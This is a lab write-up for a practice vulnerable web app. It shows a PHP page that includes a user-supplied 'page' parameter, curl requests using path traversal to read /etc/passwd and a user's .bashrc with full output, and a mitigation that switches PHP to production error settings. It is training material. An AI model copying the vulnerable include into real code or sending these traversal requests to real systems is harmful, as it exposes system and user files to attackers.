# Example1

## Code

```php
<?php require_once '../header.php'; ?>

<?php
	if ($_GET["page"]) {
		include($_GET["page"]);
	} 
?>

<?php require_once '../footer.php'; ?>
```

## Writeup

In this code if the parameter **page** exist then **page** will be included in the page.

```bash
curl -X GET "http://web-for-pentester/fileincl/example1.php?page=intro.php"
```

If we insert a page that not exist, all error will be promted:

```bash
curl -X GET "http://web-for-pentester/fileincl/example1.php?page=not-exist.php"
```

With this result:

```
Warning: include(not-exist.php): failed to open stream: No such file or directory in /var/www/fileincl/example1.php on line 7

Warning: include(): Failed opening 'not-exist.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/fileincl/example1.php on line 7
```

With this information we can know the path of the script, the line of the code there is the error and the function called.

We can use it to show some file, for example **/etc/passwd**:

```bash
curl -X GET "http://web-for-pentester/fileincl/example1.php?page=../../../etc/passwd"
```

With this output:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
mysql:x:101:103:MySQL Server,,,:/var/lib/mysql:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
openldap:x:103:106:OpenLDAP Server Account,,,:/var/lib/ldap:/bin/false
user:x:1000:1000:Debian Live user,,,:/home/user:/bin/bash
```

**N.B.** The home directory of **user** is readable by all:

```bash
total 20K
drwxr-xr-x 3 user user  160 Jun 18 16:46 .
drwxr-xr-x 3 root root   60 Jun 18 16:10 ..
-rw------- 1 user user  163 Jun 18 16:46 .bash_history
-rw-r--r-- 1 user user  220 Jun 18 16:10 .bash_logout
-rw-r--r-- 1 user user 3.2K Jun 18 16:10 .bashrc
drwx------ 3 user user   60 Jun 18 16:10 .kde
-rw-r--r-- 1 user user  675 Jun 18 16:10 .profile
-rw-r--r-- 1 user user   19 Jun 18 16:10 .su-to-rootrc
```

We can use the **file inclusion** to read the **.bashrc** file:

```bash
curl -X GET "http://web-for-pentester/fileincl/example1.php?page=../../../home/user/.bashrc"
```

With this output:

```bash
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
[ -z "$PS1" ] && return

# don't put duplicate lines in the history. See bash(1) for more options
# don't overwrite GNU Midnight Commander's setting of `ignorespace'.
HISTCONTROL=$HISTCONTROL${HISTCONTROL+:}ignoredups
# ... or force ignoredups and ignorespace
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# make less more friendly for non-text input files, see lesspipe(1)
#[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "$debian_chroot" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
	# We have color support; assume it's compliant with Ecma-48
	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
	# a case would tend to support setf rather than setaf.)
	color_prompt=yes
    else
	color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    #alias grep='grep --color=auto'
    #alias fgrep='fgrep --color=auto'
    #alias egrep='egrep --color=auto'
fi

# some more ls aliases
#alias ll='ls -l'
#alias la='ls -A'
#alias l='ls -CF'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if [ -f /etc/bash_completion ] && ! shopt -oq posix; then
    . /etc/bash_completion
fi
```

## Mitigation #1

The Web Server **Apache2** use an PHP environment in **debug** mode.

We can change the configuration to **production**.

First of all, let's make a backup of the current configuration:

```bash
cp /etc/php5/apache2/php.ini /home/user/
```

Now we can copy the production configuration:

```bash
cp /usr/share/php5/php.ini-production /etc/php5/apache2/php.ini
```

Restart the server:

```bash
/etc/init.d/apache2 restart
```

We can try to get a page that not exists:

```bash
curl -X GET "http://web-for-pentester/fileincl/example1.php?page=not-exist.php"
```

And no errors will be printed